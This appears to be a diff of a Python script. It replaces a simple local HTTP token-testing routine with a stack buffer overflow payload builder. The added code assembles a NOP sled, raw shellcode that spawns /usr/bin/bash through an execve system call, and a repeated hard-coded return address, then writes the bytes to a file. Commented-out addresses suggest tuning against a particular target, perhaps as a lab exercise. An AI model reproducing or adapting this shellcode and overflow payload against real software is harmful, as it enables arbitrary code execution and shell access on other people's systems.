@@ -1,23 +1,20 @@
-import requests as r
 import sys
-import random
-import string
 
-num = int(sys.argv[1])
+total = int(sys.argv[1])
 
-letters = string.ascii_lowercase
-result_str = ''.join(random.choice(letters) for i in range(num))
 
-print("Payload:", result_str)
+payload = b"\x31\xc0\x83\xec\x01\x88\x04\x24\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x68\x2f\x75\x73\x72\x89\xe6\x50\x56\xb0\x0b\x89\xf3\x89\xe1\x31\xd2\xcd\x80\xb0\x01\x31\xdb\xcd\x80"
+return_adres = b"\xfc\xdb\xff\xff\xff\x7f" * 10
+# return_adres =   b"\xbc\xdc\xff\xff\xff\x7f" * 10
+# 7fffffffdbfc
+# 7fffffffdc9c
+# 7fffffffdcbc
 
-try:
-    response = r.get("http://localhost:8081", headers={
-        "Authorization" : f"Bearer {result_str}"
-        })
-except:
-    print("Request failed")
-    sys.exit(1)
+instructions = payload + return_adres
+instructions = (b"\x90" * (total - len(instructions))) + instructions
 
-# print(response.raw.read(10))
-print(response.status_code)
-print(response.content)
+print(len(instructions))
+print(instructions)
+with open("nop", "wb") as f:
+    f.write(instructions)
+
